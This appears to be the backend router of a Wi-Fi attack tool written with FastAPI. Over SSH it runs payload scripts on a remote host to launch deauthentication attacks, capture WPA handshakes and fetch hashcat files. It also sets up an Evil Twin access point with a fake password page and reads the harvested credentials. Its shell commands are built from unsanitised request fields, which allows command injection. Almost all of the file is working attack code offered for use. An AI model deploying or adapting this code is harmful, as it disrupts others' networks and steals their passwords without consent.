from fastapi import APIRouter, HTTPException
from fastapi.responses import FileResponse
from pydantic import BaseModel
from app.modules.ai_agent.service import ai_service
from app.core.ssh_manager import ssh_client
import os
import time
import json
from pathlib import Path

router = APIRouter()


# ==========================================
# 1. 请求模型定义
# ==========================================
class AttackRequest(BaseModel):
    bssid: str
    interface: str = "wlan0"
    channel: str = "1"
    duration: int = 60
    ap_interface: str = "wlan1"
    ssid: str = "Free_WiFi"
    template_html: str = ""


class AIAnalysisRequest(BaseModel):
    ssid: str
    encryption: str
    bssid: str


# ==========================================
# 2. 辅助工具：自动定位 Payload 脚本
# ==========================================
def find_payload_script(script_name: str):
    current_file = Path(__file__).resolve()
    search_paths = [
        current_file.parents[5] / "kali_payloads" / script_name,
        current_file.parents[4] / "kali_payloads" / script_name,
        Path.cwd() / "kali_payloads" / script_name,
        Path.cwd().parent / "kali_payloads" / script_name,
    ]
    for p in search_paths:
        if p.exists():
            return str(p)
    return None


# ==========================================
# 3. 基础功能：文件下载
# ==========================================
@router.get("/download/{filename}")
async def download_file(filename: str):
    if ".." in filename or "/" in filename:
        raise HTTPException(400, "Invalid filename")

    possible_paths = [
        Path.cwd() / "captures" / filename,
        Path(__file__).resolve().parents[4] / "captures" / filename
    ]

    file_path = None
    for p in possible_paths:
        if p.exists():
            file_path = p
            break

    if not file_path:
        raise HTTPException(404, "File not found")

    return FileResponse(path=file_path, filename=filename, media_type='application/octet-stream')


# ==========================================
# 4. 核心攻击功能：Deauth
# ==========================================
@router.post("/deauth")
async def start_deauth_attack(req: AttackRequest):
    if not ssh_client.client: ssh_client.connect()

    script_name = "attack_worker.py"
    local_path = find_payload_script(script_name)
    if not local_path: raise HTTPException(500, f"缺失 {script_name}")

    try:
        remote_path = ssh_client.upload_payload(local_path, script_name)
        duration = int(req.duration)
        cmd = f"nohup python3 {remote_path} deauth --bssid {req.bssid} --interface {req.interface} --channel {req.channel} --duration {duration} > /tmp/attack_deauth.log 2>&1 &"
        ssh_client.exec_command(cmd)
        return {"status": "started", "msg": "Deauth 攻击已启动", "log": "/tmp/attack_deauth.log"}
    except Exception as e:
        raise HTTPException(500, f"执行异常: {str(e)}")


# ==========================================
# 5. 核心攻击功能：握手包捕获 (关键修复)
# ==========================================
@router.post("/handshake")
async def start_handshake_capture(req: AttackRequest):
    if not ssh_client.client: ssh_client.connect()

    script_name = "attack_worker.py"
    local_path = find_payload_script(script_name)
    if not local_path: raise HTTPException(500, f"本地找不到 {script_name}")

    remote_path = ssh_client.upload_payload(local_path, script_name)

    # 这里的 timeout 要比 duration 长一点，防止 SSH 超时断开
    cmd = f"python3 {remote_path} handshake --bssid {req.bssid} --interface {req.interface} --channel {req.channel} --duration {req.duration}"

    try:
        # get_pty=True 才能获取实时输出
        stdin, stdout, stderr = ssh_client.exec_command(cmd, timeout=req.duration + 20, get_pty=True)
        output = stdout.read().decode()

        response_data = {"status": "failed", "msg": "未捕获到握手包", "debug": output}

        local_dir = Path.cwd() / "captures"
        if not local_dir.exists(): local_dir.mkdir(parents=True, exist_ok=True)

        # 检查是否成功
        if "CAPTURED_HS_POTENTIAL" in output:
            remote_prefix = f"/tmp/handshake_{req.bssid.replace(':', '')}"
            ts = int(time.time())

            # 1. 下载原始 .cap 文件
            remote_cap = f"{remote_prefix}-01.cap"
            local_cap = f"handshake_{req.bssid.replace(':', '')}_{ts}.cap"

            # 检查文件是否存在
            check = ssh_client.exec_command(f"ls {remote_cap}")[1].read()

            if check:
                if ssh_client.download_file(remote_cap, str(local_dir / local_cap)):
                    response_data["status"] = "success"
                    response_data["msg"] = "成功捕获握手包"
                    response_data["cap_file"] = local_cap

            # 2. 下载 Hashcat 文件 (如果有)
            remote_hc = f"{remote_prefix}.hc22000"
            local_hc = f"handshake_{req.bssid.replace(':', '')}_{ts}.hc22000"
            check_hc = ssh_client.exec_command(f"ls {remote_hc}")[1].read()
            if check_hc:
                if ssh_client.download_file(remote_hc, str(local_dir / local_hc)):
                    response_data["hash_file"] = local_hc

        return response_data

    except Exception as e:
        return {"status": "error", "msg": str(e)}


# ==========================================
# 6. AI 分析接口
# ==========================================
@router.post("/ai/analyze_target")
async def analyze_target(req: AIAnalysisRequest):
    try:
        raw = ai_service.analyze_wifi_target(req.ssid, req.encryption, "Unknown")
        if isinstance(raw, dict) and "risk_level" in raw: return raw
        return {"risk_level": "中", "summary": "Info", "advice": "Attempt handshake capture"}
    except:
        return {"risk_level": "Unknown"}


# ==========================================
# 7. Evil Twin 接口
# ==========================================
@router.get("/eviltwin/templates")
async def get_templates():
    return {"status": "success", "data": [
        {"name": "Generic Login",
         "content": "<html><body><h1>Login</h1><form method='POST'><input name='p' type='password'><button>Go</button></form></body></html>"}
    ]}


@router.post("/eviltwin/start")
async def start_evil_twin(req: AttackRequest):
    if req.interface == req.ap_interface:
        raise HTTPException(400, "Interfaces must be different")

    if not ssh_client.client: ssh_client.connect()

    # Upload scripts
    et_script = ssh_client.upload_payload(find_payload_script("eviltwin_worker.py"), "eviltwin_worker.py")
    atk_script = ssh_client.upload_payload(find_payload_script("attack_worker.py"), "attack_worker.py")

    # Start AP
    clean_html = req.template_html.replace('"', '\\"').replace('`', '\\`')
    ssh_client.exec_command("echo '[Init] Starting AP...' > /tmp/eviltwin.log")
    cmd_ap = f"nohup python3 {et_script} --interface {req.ap_interface} --ssid '{req.ssid}' --channel {req.channel} --template \"{clean_html}\" >> /tmp/eviltwin.log 2>&1 &"
    ssh_client.exec_command(cmd_ap)

    # Start Deauth (Infinite)
    ssh_client.exec_command("echo '[Init] Starting Attack...' > /tmp/et_deauth.log")
    cmd_atk = f"nohup python3 {atk_script} deauth --bssid {req.bssid} --interface {req.interface} --channel {req.channel} --duration 0 >> /tmp/et_deauth.log 2>&1 &"
    ssh_client.exec_command(cmd_atk)

    return {"status": "started", "msg": "Evil Twin Started"}


@router.post("/eviltwin/stop")
async def stop_evil_twin():
    if not ssh_client.client: ssh_client.connect()
    ssh_client.exec_command("pkill -f eviltwin_worker.py")
    ssh_client.exec_command("pkill -f attack_worker.py")
    ssh_client.exec_command("killall hostapd dnsmasq aireplay-ng airodump-ng")
    ssh_client.exec_command("iptables -t nat -F")
    return {"status": "success"}


@router.get("/eviltwin/credentials")
async def get_creds():
    if not ssh_client.client: ssh_client.connect()
    try:
        out = ssh_client.exec_command("cat /tmp/eviltwin/captured_creds.txt")[1].read().decode()
        return {"status": "success", "data": [l.strip() for l in out.splitlines() if l.strip()]}
    except:
        return {"status": "empty", "data": []}


@router.get("/eviltwin/logs")
async def get_logs():
    if not ssh_client.client: ssh_client.connect()
    try:
        cmd = "tail -n 5 /tmp/eviltwin.log; echo '---'; tail -n 5 /tmp/et_deauth.log"
        out = ssh_client.exec_command(cmd)[1].read().decode()
        return {"status": "success", "logs": [l.strip() for l in out.splitlines() if l.strip()]}
    except:
        return {"status": "error", "logs": []}